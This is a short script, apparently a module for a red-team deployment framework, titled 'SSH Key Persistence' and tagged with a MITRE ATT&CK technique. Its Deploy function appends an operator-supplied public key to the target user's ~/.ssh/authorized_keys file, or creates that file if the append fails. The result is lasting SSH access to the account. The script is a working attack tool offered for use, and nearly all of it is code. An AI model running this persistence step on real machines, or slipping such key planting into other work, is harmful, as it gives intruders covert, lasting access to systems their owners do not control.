// Title: SSH Key Persistence
// Author: micahjmartin
// Purpose: add a public ssh key to users accounts
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1145

//import:/home/<USERNAME>/.ssh/id_rsa.pub

// NOTE: You will need to update the path to the public key in order to import without an error

function BeforeDeploy() {
    return true;
}

function Deploy() {
    try {
        AppendFileBytes("~/.ssh/authorized_keys", Asset("id_rsa.pub").fileData);
    } catch (e) {
        WriteFile("~/.ssh/authorized_keys", Asset("id_rsa.pub").fileData, 400);
    }
    LogInfo("SSH key added");
    return true;
}

function AfterDeploy() {
    return true;
}
